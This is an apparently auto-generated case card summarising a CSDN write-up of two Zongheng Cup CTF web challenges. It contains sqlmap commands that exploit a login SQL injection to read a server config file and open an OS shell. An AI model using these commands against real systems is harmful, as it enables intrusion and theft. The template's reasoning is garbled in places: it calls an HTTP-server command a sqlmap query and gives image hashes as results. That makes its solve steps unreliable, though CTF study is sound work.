# 纵横杯CTF部分WEB题解_ChenZIDu的博客-CSDN博客

## Case Metadata

- Category: `Web`
- Platform: `纵横杯CTF部分WEB题解`
- Difficulty: `unknown`
- Source repository: `https://github.com/apachecn/apachecn-ctf-wiki`
- Source commit: `762ca130572c95196cf120e5f4ad5fbdd88b1b93`
- Source file: `docs/纵横杯CTF部分WEB题解_ChenZIDu的博客-CSDN博客.md`
- Source URL: `https://github.com/apachecn/apachecn-ctf-wiki/blob/762ca130572c95196cf120e5f4ad5fbdd88b1b93/docs/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF%E9%83%A8%E5%88%86WEB%E9%A2%98%E8%A7%A3_ChenZIDu%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2.md`
- Local source mirror: `sources/apachecn-apachecn-ctf-wiki/repo/docs/纵横杯CTF部分WEB题解_ChenZIDu的博客-CSDN博客.md`

## Why This Case Matters

Use this case as a Web reference for web-app challenges.

## Input Signals

- Artifacts: web-app
- Tools: sqlmap
- Techniques: command-injection, http-analysis, sql-injection, web-exploitation

## First-Principles Route

- Identify the exposed entry point, reflected behavior, trust boundary, and any explicit hints or blacklists.
- Validate the suspected primitive with the smallest payload that proves code/data/control influence.
- Chain the primitive into file read, code execution, auth bypass, or state manipulation only after recording the bypass condition.

## Linked Assets

- Referenced assets: `3`
- `docs/img/e80201ab17266f29af5470c68f7abeee.png`
- `docs/img/6f6a5eb00d9fb22a51e4efc158e1956d.png`
- `docs/img/559ea27e0f373791b5c8444613a7ba8e.png`

## Solve Thinking

### Step 1: Document

- Route type: `sqlmap-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use sqlmap to collect the smallest evidence slice that answers the goal.
- Tools: sqlmap
- Reasoning chain:
  - Recognize the section as sqlmap-driven evidence lookup.
  - Use sqlmap to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `-->`

### Step 2: 纵横杯CTF部分WEB题解_ChenZIDu的博客-CSDN博客

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use sqlmap to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: sqlmap
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use sqlmap to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `> 来源：[https://blog.csdn.net/chenzidu/article/details/111792190](https://blog.csdn.net/chenzidu/article/details/111792190)`

### Step 3: easyci

- Route type: `sql injection exploitation`
- Why: SQLi cases are cheapest when the injection style is classified early and every response difference is recorded.
- Probe: Use sqlmap with the extracted filter/query `sqlmap -u http://eci-2ze0xe7juyhmgubdhea1.cloudeci1.ichunqiu.com/public/index.php/home/login --data "username=admin&password=1" -p username --technique B --dbms mysql --threads=10 --file-read="/etc/apache2/apache2.conf"` and inspect the matching evidence.
- Tools: sqlmap
- Filters or commands:
  - `sqlmap -u http://eci-2ze0xe7juyhmgubdhea1.cloudeci1.ichunqiu.com/public/index.php/home/login --data "username=admin&password=1" -p username --technique B --dbms mysql --threads=10 --file-read="/etc/apache2/apache2.conf"`
  - `sqlmap -u http://eci-2ze3qpk9e6qoggl1cuol.cloudeci1.ichunqiu.com/public/index.php/home/login --data "username=admin&password=1" -p username --technique B --dbms mysql --os-shell`
- Reasoning chain:
  - Recognize the section as sql injection exploitation.
  - Use sqlmap with the extracted filter/query `sqlmap -u http://eci-2ze0xe7juyhmgubdhea1.cloudeci1.ichunqiu.com/public/index.php/home/login --data "username=admin&password=1" -p username --technique B --dbms mysql --threads=10 --file-read="/etc/apache2/apache2.conf"` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `e80201ab17266f29af5470c68f7abeee`

### Step 4: ezcms

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use sqlmap with the extracted filter/query `python3 -m http.server 80` and inspect the matching evidence.
- Tools: sqlmap
- Filters or commands:
  - `python3 -m http.server 80`
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use sqlmap with the extracted filter/query `python3 -m http.server 80` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `6f6a5eb00d9fb22a51e4efc158e1956d`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
